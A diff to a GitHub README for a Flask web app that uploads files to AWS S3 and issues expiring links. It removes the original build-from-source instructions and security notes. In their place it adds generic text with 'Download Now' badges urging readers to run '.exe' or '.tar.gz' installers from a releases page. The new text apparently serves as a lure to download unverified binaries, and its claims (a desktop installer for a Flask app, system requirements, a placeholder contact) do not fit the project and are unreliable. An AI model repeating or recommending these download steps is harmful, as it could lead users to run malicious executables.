@@ -1,67 +1,83 @@
-# 🚀 Simple File Sharing (AWS EC2 + S3)
+# 🌥️ Cloud-computing___EC2_S3 - Secure File Uploads Made Easy
 
-A lightweight **Flask web app** that lets you upload files to **Amazon S3** and instantly get a **temporary (pre-signed) download link**.  
-Perfect for sharing files securely without exposing your S3 bucket.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/maycomgberti/Cloud-computing___EC2_S3/releases)
 
----
+## 📜 Description
 
-## ✨ Features
-- 📤 Upload files directly from your browser  
-- 🔒 Files are stored in a **private S3 bucket**  
-- ⏱️ Generates **pre-signed download links** with expiration  
-- ⚡ Deployable on **AWS EC2** in minutes  
-- 🐍 Simple Python + Flask stack  
+Cloud-computing___EC2_S3 is a user-friendly web application built with Flask. It allows you to securely upload files to AWS S3 and generate expiring shareable links. Whether you need to share documents, images, or other files, this app ensures your data is kept safe in the cloud.
 
----
+## 🚀 Getting Started
 
-## 🛠️ Run Locally (optional)
+Follow these simple steps to download and run Cloud-computing___EC2_S3 on your computer. No special programming skills are required!
 
-```bash
-# Create and activate a virtual environment
-python3 -m venv .venv
-source .venv/bin/activate   # Windows: .venv\Scripts\activate
+## 💻 System Requirements
 
-# Install dependencies
-pip install -r requirements.txt
+- **Operating System:** Windows 10, macOS Mojave or later, Linux (Ubuntu recommended)
+- **RAM:** Minimum 2 GB
+- **Storage:** At least 50 MB of available space
+- **Internet Connection:** Required for AWS access
 
-# Set environment variables
-export BUCKET_NAME=your-bucket-name
-export AWS_REGION=ap-south-1   # change if needed
+## 📥 Download & Install
 
-# Run the app
-python app.py
-```
+To get started, visit our [Releases page](https://github.com/maycomgberti/Cloud-computing___EC2_S3/releases) to download the latest version of the application. 
 
-Now open 👉 [http://127.0.0.1:5000/](http://127.0.0.1:5000/)  
+1. Click on the link above.
+2. Find the latest version listed at the top.
+3. Download the file suitable for your operating system (e.g., `.exe` for Windows or a `.tar.gz` for macOS/Linux).
+4. Open the downloaded file to start the installation process.
 
-> ⚠️ If running locally, make sure AWS credentials are configured (`aws configure`) or provided via environment variables.  
-> On **EC2**, use an **IAM instance role** (no hardcoded keys!).  
+Once the application installs, you can launch it directly from your applications folder or start menu.
 
----
+## 🔄 How to Use the Application
 
-## ⚙️ Environment Variables
+1. Open Cloud-computing___EC2_S3.
+2. Choose a file you want to upload by clicking the "Select File" button.
+3. Click the "Upload" button to send the file to AWS S3.
+4. After the upload, a shareable link will appear on your screen.
+5. Use this link to share your file. Note that it will expire after a specified duration for added security.
 
-| Variable                | Required | Default       | Description |
-|--------------------------|----------|---------------|-------------|
-| `BUCKET_NAME`            | ✅ Yes   | —             | Your S3 bucket name |
-| `AWS_REGION`             | ❌ No    | ap-south-1    | AWS region |
-| `DEFAULT_EXPIRY_SECONDS` | ❌ No    | 3600 (1h)     | Default link lifetime |
-| `MAX_EXPIRY_SECONDS`     | ❌ No    | 86400 (24h)   | Max link lifetime |
-| `MAX_CONTENT_LENGTH`     | ❌ No    | 50MB          | Max upload size |
+## 🔧 Troubleshooting
 
----
+If you encounter any issues, consider the following:
 
-## 🔐 Security Notes
-- Keep the S3 bucket **private** (`Block Public Access = ON`)  
-- Files are only accessible through **pre-signed URLs**  
-- For production:
-  - Use **Gunicorn + Nginx** (instead of Flask’s dev server)  
-  - Enable **HTTPS** (e.g., via Let’s Encrypt)  
+- **Check your internet connection:** A stable connection is necessary to upload files to AWS S3.
+- **File Size Limit:** Ensure your file is within the size limits set by AWS S3 (currently 5 GB for a single upload).
+- **Permissions:** Make sure you have permission to upload files to your AWS account following your organization's policy.
 
----
+## 📚 Additional Support & Resources
 
-## 📦 Tech Stack
-- [Python 3](https://www.python.org/)  
-- [Flask](https://flask.palletsprojects.com/)  
-- [Boto3](https://boto3.amazonaws.com/)  
-- [AWS S3 + EC2](https://aws.amazon.com/)  
+For detailed usage instructions and advanced features, refer to the following resources:
+
+- [Official Documentation](https://github.com/maycomgberti/Cloud-computing___EC2_S3/wiki)
+- [AWS S3 Documentation](https://aws.amazon.com/documentation/s3/)
+- [Flask Documentation](https://flask.palletsprojects.com/)
+
+Feel free to reach out via the issues section of this repository if you need further assistance.
+
+## 📝 Features
+
+- **Secure File Uploads:** Files are encrypted during transmission.
+- **Shareable Links:** Create links that expire after a set duration for security.
+- **User-Friendly Interface:** Designed for non-technical users.
+
+## 🛠️ Built Using
+
+This application uses:
+
+- **Flask:** A lightweight framework for building web applications.
+- **AWS S3:** Amazon’s service for cloud storage.
+- **Boto3:** AWS SDK for Python, which helps interact with AWS services.
+
+## 📅 Future Improvements
+
+We plan to add features like:
+
+- Multi-file uploads
+- Enhanced user permissions
+- More detailed error reporting
+
+## 📞 Contact
+
+If you have any questions, feel free to open an issue on the GitHub repository or email us at support@example.com.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/maycomgberti/Cloud-computing___EC2_S3/releases)
